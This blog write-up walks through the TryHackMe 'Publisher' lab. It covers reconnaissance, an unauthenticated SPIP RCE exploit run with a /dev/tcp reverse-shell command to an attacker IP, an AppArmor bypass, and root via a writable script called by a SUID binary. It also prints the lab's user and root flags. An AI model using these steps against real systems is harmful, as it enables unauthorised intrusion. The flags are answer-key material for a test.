---
layout: post
title:  "THM: Publisher"
date:   2024-08-11
description: Publisher is an easy box from TryHackMe which features a vulnerable instance of SPIP that allows us to get unauthenticated RCE. After getting user on the box, we notice that we are being blocked by some sort of ACL. The root step involves bypassing AppArmor, and exploiting an unexpected SUID in which we have control over to get a shell as root.
tags: thm nmap spip cve-2023-27372 apparmor
---

## Overview
Publisher is an easy box from TryHackMe which features a vulnerable instance of SPIP that allows us to get unauthenticated RCE.
After getting user on the box, we notice that we are being blocked by some sort of ACL.
The root step involves bypassing AppArmor, and exploiting an unexpected SUID in which we have control over to get a shell as root.

## Recon

### nmap
```
# Nmap 7.94SVN scan initiated Wed Aug  7 11:31:25 2024 as: nmap -sS -sC -sV -vv -oA nmap/publisher 10.10.237.9
Nmap scan report for 10.10.237.9 (10.10.237.9)
Host is up, received reset ttl 61 (0.37s latency).
Scanned at 2024-08-07 11:31:32 +08 for 23s
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 8.2p1 Ubuntu 4ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 44:5f:26:67:4b:4a:91:9b:59:7a:95:59:c8:4c:2e:04 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDMc4hLykriw3nBOsKHJK1Y6eauB8OllfLLlztbB4tu4c9cO8qyOXSfZaCcb92uq/Y3u02PPHWq2yXOLPler1AFGVhuSfIpokEnT2jgQzKL63uJMZtoFzL3RW8DAzunrHhi/nQqo8sw7wDCiIN9s4PDrAXmP6YXQ5ekK30om9kd5jHG6xJ+/gIThU4ODr/pHAqr28bSpuHQdgphSjmeShDMg8wu8Kk/B0bL2oEvVxaNNWYWc1qHzdgjV5HPtq6z3MEsLYzSiwxcjDJ+EnL564tJqej6R69mjII1uHStkrmewzpiYTBRdgi9A3Yb+x8NxervECFhUR2MoR1zD+0UJbRA2v1LQaGg9oYnYXNq3Lc5c4aXz638wAUtLtw2SwTvPxDrlCmDVtUhQFDhyFOu9bSmPY0oGH5To8niazWcTsCZlx2tpQLhF/gS3jP/fVw+H6Eyz/yge3RYeyTv3ehV6vXHAGuQLvkqhT6QS21PLzvM7bCqmo1YIqHfT2DLi7jZxdk=
|   256 0a:4b:b9:b1:77:d2:48:79:fc:2f:8a:3d:64:3a:ad:94 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJNL/iO8JI5DrcvPDFlmqtX/lzemir7W+WegC7hpoYpkPES6q+0/p4B2CgDD0Xr1AgUmLkUhe2+mIJ9odtlWW30=
|   256 d3:3b:97:ea:54:bc:41:4d:03:39:f6:8f:ad:b6:a0:fb (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFG/Wi4PUTjReEdk2K4aFMi8WzesipJ0bp0iI0FM8AfE
80/tcp open  http    syn-ack ttl 60 Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Publisher's Pulse: SPIP Insights & Tips
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Aug  7 11:31:55 2024 -- 1 IP address (1 host up) scanned in 29.81 seconds
```

### Website (TCP 80)
Visiting the website, we know that it is using SPIP CMS.
A blog post on the sidebar mentions a recent security release for SPIP 4.1.5, 4.0.8 and 3.2.16, and based on this info, it is likely that the version running on the website is around the release dates for those.
A quick search online shows that there is an [unauthenticated RCE for SPIP 4.2.0](https://www.exploit-db.com/exploits/51536).
However, I wasn't able to confirm the SPIP version as the meta name tag was removed.

I'll run a `ffuf` scan to enumerate for other directories.

```
$ ffuf -u 'http://10.10.237.9/FUZZ' -w /usr/share/wordlists/dirb/common.txt
...[SNIP]...
.htpasswd            
.htaccess            
images               
server-status        
spip                 
```

At http://10.10.237.9/spip, we find the version 4.2.0 in the meta tag.

## Shell as www-data

I'll run the exploit to get a reverse shell onto the box as www-data.

```
$ python3 ./51536.py -u http://10.10.237.9/spip -c "bash -c 'bash -i >& /dev/tcp/10.4.94.33/9001 0>&1'" -v
```

Enumerating the `/etc/passwd` file, we find another user, think.
```
www-data@41c976e507f8:/home/think/spip/spip$ cat /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
think:x:1000:1000::/home/think:/bin/sh
```

Oddly, the www-data user is misconfigured to have permissions over the user's home directory.
Therefore, we can directly read the user flag.

User: fa229046d44eda6a3598c73ad96f4ca5

## Shell as think

I coped the SSH key from think's home directory, and logged onto the box as think.

Next, I tried to upload linpeas to the `/tmp` directory, but got a permission denied.

![No write perms to /tmp](/assets/img/2024-08-11-thm-publisher/cmd_denied.png)

This is unexpected as the `/tmp` directory should be writable for all users, so something like an ACL is blocking us here.

Luckily, we can still write to `/dev/shm` and I got linpeas running.

![AppArmor profile enabled](/assets/img/2024-08-11-thm-publisher/apparmor_enabled.png)

From the linpeas output, there is an AppArmor profile being applied to `/usr/sbin/ash`, which is the shell that we are currently in.

```
think@publisher:/dev/shm$ echo $0
-ash
```

### Enumerating AppArmor

I referenced [HackTricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/apparmor) to enumerate AppArmor.

```
think@publisher:/dev/shm$ aa-enabled
Yes
```

The AppArmor profile for `/usr/sbin/ash`
```
think@publisher:/dev/shm$ cat /etc/apparmor.d/usr.sbin.ash
#include <tunables/global>

/usr/sbin/ash flags=(complain) {
  #include <abstractions/base>
  #include <abstractions/bash>
  #include <abstractions/consoles>
  #include <abstractions/nameservice>
  #include <abstractions/user-tmp>

  # Remove specific file path rules
  # Deny access to certain directories
  deny /opt/ r,
  deny /opt/** w,
  deny /tmp/** w,
  deny /dev/shm w,
  deny /var/tmp w,
  deny /home/** w,
  /usr/bin/** mrix,
  /usr/sbin/** mrix,

  # Simplified rule for accessing /home directory
  owner /home/** rix,
}
```

The profile explains why we had no write permissions over the `/tmp` directory earlier.

AppArmor profiles only apply to a specific binary (in this case `ash`).
Therefore, if we open another session in `bash`, we should be able to bypass AppArmor.

I'll copy `/usr/bin/bash` to `/dev/shm/bash` and execute it with the `-ip` flags to escape AppArmor.

## Shell as root

```
think@publisher:/$ find / -type f -perm -4000 2>/dev/null | grep -v 'sys\|lib\|proc'
/usr/sbin/pppd
/usr/sbin/run_container
/usr/bin/at
/usr/bin/fusermount
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/mount
/usr/bin/su
/usr/bin/newgrp
/usr/bin/pkexec
/usr/bin/umount
```

`/usr/sbin/run_container` is an unexpected SUID binary.

I'll run an `ltrace` on it to find what libraries are being called.
```
think@publisher:/$ ltrace /usr/sbin/run_container                                              
--- Called exec() ---                                                                          
permission denied while trying to connect to the Docker daemon socket at unix:///var/run/docker.sock: Get "http://%2Fvar%2Frun%2Fdocker.sock/v1.24/containers/json?all=1": dial unix /var/run/
docker.sock: connect: permission denied
--- SIGCHLD (Child exited) ---                 
docker: permission denied while trying to connect to the Docker daemon socket at unix:///var/run/docker.sock: Post "http://%2Fvar%2Frun%2Fdocker.sock/v1.24/containers/create": dial unix /var
/run/docker.sock: connect: permission denied.  
See 'docker run --help'.                       
--- SIGCHLD (Child exited) ---                 
List of Docker containers:                     
permission denied while trying to connect to the Docker daemon socket at unix:///var/run/docker.sock: Get "http://%2Fvar%2Frun%2Fdocker.sock/v1.24/containers/json?all=1": dial unix /var/run/
docker.sock: connect: permission denied                                                        
--- SIGCHLD (Child exited) ---                 
                                                                                                                                                                                              Enter the ID of the container or leave blank to create a new one: 1                            
/opt/run_container.sh: line 16: validate_container_id: command not found 
```

There is a call to `/opt/run_container.sh`, which we have write permissions over.

![Permissions over run_container.sh](/assets/img/2024-08-11-thm-publisher/opt_perms.png)

I'll add a line to the script to launch a shell as root when `/usr/sbin/run_container` is executed.

```
echo "bash -ip" >> /opt/run_container.sh
```

![Shell as root](/assets/img/2024-08-11-thm-publisher/root_shell.png)

Root: 3a4225cc9e85709adda6ef55d6a4f2ca
